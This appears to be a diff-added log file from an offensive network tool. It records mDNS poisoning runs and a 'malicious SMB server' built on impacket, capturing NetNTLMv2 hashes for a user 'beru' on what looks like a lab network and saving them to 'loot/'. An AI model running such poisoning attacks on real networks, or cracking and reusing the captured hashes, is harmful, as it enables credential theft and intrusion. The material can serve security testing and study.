+2022-03-02 19:54:15.555 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:9b45db11f0718e52dfdf5cb00eae5e04:0101000000000000808d7a4b6f2ed8018f9fb27eed0784150000000001001000520054006400700050004c005000620003001000520054006400700050004c005000620002001000450062004e005700510076004d00680004001000450062004e005700510076004d00680007000800808d7a4b6f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:54:15.555 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:9b45db11f0718e52dfdf5cb00eae5e04:0101000000000000808d7a4b6f2ed8018f9fb27eed0784150000000001001000520054006400700050004c005000620003001000520054006400700050004c005000620002001000450062004e005700510076004d00680004001000450062004e005700510076004d00680007000800808d7a4b6f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:54:15.572 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:54:15.572 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:54:16.941 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:16.942 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:16.943 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:16.943 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:16.944 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:16.944 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:16.945 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:16.946 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:17.940 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:17.940 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:17.942 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:17.942 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:17.944 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:17.944 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:17.946 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:54:17.947 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:54:26.285 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 19:54:26.285 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 19:54:26.328 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50463)
+2022-03-02 19:54:26.328 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50463)
+2022-03-02 19:54:26.342 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 19:54:26.342 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 19:54:28.538 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:54:28.539 | SUCCESS  | project.network.mitm.mss:__end_process_in_the_background:114 - Finishing attack in the background ...
+2022-03-02 19:54:28.539 | SUCCESS  | project.network.mitm.mss:__end_process_in_the_background:114 - Finishing attack in the background ...
+2022-03-02 19:54:57.396 | DEBUG    | project.network.mitm.mss:do_mss:203 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 19:54:57.397 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 19:54:57.403 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:54:57.403 | INFO     | project.network.mitm.mss:__wrapper_attack:88 - Running mss the results will be saved in : loot/
+2022-03-02 19:54:57.409 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:54:57.409 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:66 - Starting Malicious SMB Server ...
+2022-03-02 19:54:57.413 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:54:57.413 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 19:54:57.414 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:54:57.414 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 19:54:57.414 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:54:57.414 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 19:55:12.088 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:12.090 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:12.091 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:55:12.136 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:12.137 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:12.137 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 19:55:12.181 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:12.182 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:12.186 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:12.187 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.082 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.084 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.087 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50464)
+2022-03-02 19:55:13.087 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50464)
+2022-03-02 19:55:13.091 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.092 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.124 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:55:13.124 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 19:55:13.125 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:55:13.125 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 19:55:13.129 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:2f5f639f0b78d877e10ea525a1f4ca23:010100000000000080a60c6e6f2ed801bf8e9cc353693e7a0000000001001000580059006e0048006f00580066005a0003001000580059006e0048006f00580066005a000200100049006a00630056004300650076006d000400100049006a00630056004300650076006d000700080080a60c6e6f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:55:13.129 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:2f5f639f0b78d877e10ea525a1f4ca23:010100000000000080a60c6e6f2ed801bf8e9cc353693e7a0000000001001000580059006e0048006f00580066005a0003001000580059006e0048006f00580066005a000200100049006a00630056004300650076006d000400100049006a00630056004300650076006d000700080080a60c6e6f2ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 19:55:13.158 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:55:13.158 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 19:55:13.236 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.236 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.238 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.238 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.240 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.240 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:13.242 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:13.242 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:14.254 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:14.255 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:14.261 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:55:14.261 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:55:18.419 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:55:18.419 | WARNING  | project.network.mitm.mss:__synchronous_attack:76 - Exiting attack ...
+2022-03-02 19:59:34.919 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:59:34.919 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:59:34.919 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 19:59:34.956 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 19:59:34.956 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 19:59:34.957 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 20:20:54.920 | DEBUG    | project.utils.neo.dboperations:__init__:30 - The neo4j dirver has been created successfully
+2022-03-02 20:21:07.156 | DEBUG    | project.network.poison.poisonselector:do_poison:202 - Starting poison attack using lhost: 192.168.253.135 rhost:192.168.253.138 ipv6:fe80::20c:29ff:fe0e:d73b
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b
+2022-03-02 20:21:07.157 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 20:21:07.169 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 20:21:07.171 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:start_mdns_poisoning:155 - Starting mdns poisoning...
+2022-03-02 20:21:07.169 | INFO     | project.network.poison.poisonengine.poisonlauncher:__create_mdns:77 - Running mdns poisoning in the background
+2022-03-02 20:21:12.241 | DEBUG    | project.network.mitm.mss:do_mss:201 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 20:21:12.242 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 20:21:12.248 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:21:12.248 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:21:12.252 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:21:12.252 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:21:12.256 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:21:12.256 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:21:12.257 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:21:12.257 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:21:12.257 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:21:12.257 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:21:29.639 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:29.639 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:29.640 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 20:21:29.697 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:29.698 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:29.698 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 20:21:29.780 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:29.783 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:29.793 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:29.794 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:30.845 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:30.926 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50486)
+2022-03-02 20:21:30.926 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50486)
+2022-03-02 20:21:31.036 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:31.836 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:31.843 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:32.880 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:21:32.880 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:21:32.894 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:21:32.894 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:21:32.898 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:47d29ff8103f4f0d232040a969d8799d:010100000000000000ee341b732ed801579f886d2c23ed440000000001001000480064005400580070004d0068004a0003001000480064005400580070004d0068004a0002001000450067004d006f005900690075004b0004001000450067004d006f005900690075004b000700080000ee341b732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:21:32.898 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:47d29ff8103f4f0d232040a969d8799d:010100000000000000ee341b732ed801579f886d2c23ed440000000001001000480064005400580070004d0068004a0003001000480064005400580070004d0068004a0002001000450067004d006f005900690075004b0004001000450067004d006f005900690075004b000700080000ee341b732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:21:33.628 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:33.628 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:33.630 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:33.630 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:33.631 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:33.631 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:33.632 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:21:33.632 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:21:33.772 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:21:33.772 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:21:48.046 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:21:48.046 | INFO     | impacket.smbserver:smbComTreeDisconnect:1921 - Disconnecting Share(1:IPC$)
+2022-03-02 20:21:48.060 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50486)
+2022-03-02 20:21:48.060 | INFO     | impacket.smbserver:finish:3798 - Closing down connection (192.168.253.138,50486)
+2022-03-02 20:21:48.063 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:21:48.063 | INFO     | impacket.smbserver:removeConnection:3946 - Remaining connections []
+2022-03-02 20:21:54.923 | WARNING  | project.network.mitm.mss:__synchronous_attack:75 - Exiting attack ...
+2022-03-02 20:21:54.923 | WARNING  | project.network.mitm.mss:__synchronous_attack:75 - Exiting attack ...
+2022-03-02 20:26:10.313 | DEBUG    | project.network.mitm.mss:do_mss:201 - Starting malicious smb server attack using ip: 192.168.253.135 
+            interface: ens33 mac_address:00:0c:29:0e:d7:3b lport:445
+2022-03-02 20:26:10.321 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:26:10.314 | DEBUG    | project.shell.igris:check_settable_variables_value:250 - Checking the correct value of the necessary settable variables 
+2022-03-02 20:26:10.321 | INFO     | project.network.mitm.mss:__wrapper_attack:87 - Running mss the results will be saved in : loot/
+2022-03-02 20:26:10.329 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:26:10.329 | INFO     | project.network.mitm.servers.smbserver:start_malicious_smbserver:62 - Starting Malicious SMB Server ...
+2022-03-02 20:26:10.332 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:26:10.333 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:26:10.334 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:26:10.332 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
+2022-03-02 20:26:10.333 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+2022-03-02 20:26:10.334 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+2022-03-02 20:26:22.549 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:22.550 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:22.551 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to 192.168.253.138[0m
+2022-03-02 20:26:22.604 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:22.605 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:22.606 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:115 - [36m(MDNS) Sending packet to fe80::f1f5:96d5:abd5:67a0[0m
+2022-03-02 20:26:22.648 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:22.650 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:22.655 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:22.656 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:23.559 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:23.560 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:23.568 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:23.568 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50496)
+2022-03-02 20:26:23.568 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.138,50496)
+2022-03-02 20:26:23.570 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IPv6 / UDP / DNS Ans "192.168.253.135" 
+2022-03-02 20:26:23.605 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:26:23.605 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (SHADOW\beru,PC-BERU)
+2022-03-02 20:26:23.607 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:26:23.610 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:8f770751b8d852da2ef9c6bfcae88819:01010000000000008001a8c8732ed801f1932402a34dc5ad0000000001001000610066007600740043006900630077000300100061006600760074004300690063007700020010006c0057006c0062006a0071004b007700040010006c0057006c0062006a0071004b007700070008008001a8c8732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:26:23.607 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-BERU\beru authenticated successfully
+2022-03-02 20:26:23.610 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - beru::SHADOW:aaaaaaaaaaaaaaaa:8f770751b8d852da2ef9c6bfcae88819:01010000000000008001a8c8732ed801f1932402a34dc5ad0000000001001000610066007600740043006900630077000300100061006600760074004300690063007700020010006c0057006c0062006a0071004b007700040010006c0057006c0062006a0071004b007700070008008001a8c8732ed80106000400020000000800300030000000000000000100000000200000f393ee15b5fb21bad67a70a7c20b32c4aa011ca5e11936421d9d399c6c8c20150a0010000000000000000000000000000000000009001e0063006900660073002f0063006f00730061002e006c006f00630061006c000000000000000000
+2022-03-02 20:26:23.636 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:26:23.636 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
+2022-03-02 20:26:24.796 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:112 - Packet crafted: 
+2022-03-02 20:26:24.798 | DEBUG    | project.network.poison.poisonengine.poisoners.mdns:__send_packet:113 - Ether / IP / UDP / DNS Ans "192.168.253.135" 
